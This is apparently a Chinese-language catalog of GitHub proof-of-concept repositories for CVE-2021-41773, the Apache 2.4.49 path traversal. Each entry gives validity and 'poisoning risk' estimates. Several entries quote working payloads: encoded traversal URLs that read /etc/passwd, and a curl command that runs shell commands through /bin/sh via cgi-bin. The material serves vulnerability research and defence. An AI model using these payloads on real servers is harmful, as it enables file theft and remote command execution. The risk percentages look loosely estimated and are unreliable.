# CVE-2021-41773

> 📦 该CVE有 **43** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-41773-0xGabe_Apache-CVEs.md](../2021/CVE-2021-41773-0xGabe_Apache-CVEs.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如 `%2e`，即 URL 编码的点 `.`）的恶意 URL，绕过服务器配置的 Alias 指令限制，访问服务器上受限目录之外的文件。如果目标服务器同时启用了 CGI 脚本的执行，攻击者还可以通过类似的路径遍历方式，执行任意命令。

**有效性评估：**

根据漏洞描述、搜索引擎结果和提供的 POC 代码，可以判定此漏洞的 POC 代码具有较高的有效性。漏洞库信息明确指出此漏洞已被在野利用，搜索引擎结果也提供了相关的利用案例和分析。POC 代码 `cve-2021-41773.py` 提供了路径遍历读取文件以及远程命令执行两种利用方式，并对 Apache 服务器版本进行了简单的指纹识别。

**投毒风险评估：**

分析提供的 POC 代码，`LICENSE` 文件采用标准的 MIT 许可，`README.md` 文件描述了漏洞和利用方法，`cve-2021-41773.py` 文件实现了漏洞利用。代码逻辑相对简单，主要利用 `urllib` 和 `requests` 库发送 HTTP 请求，没有发现明显的恶意代码或者后门。存在极低的投毒风险，例如细微的编码错误或依赖项问题，因此评估投毒风险为 5%。

**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

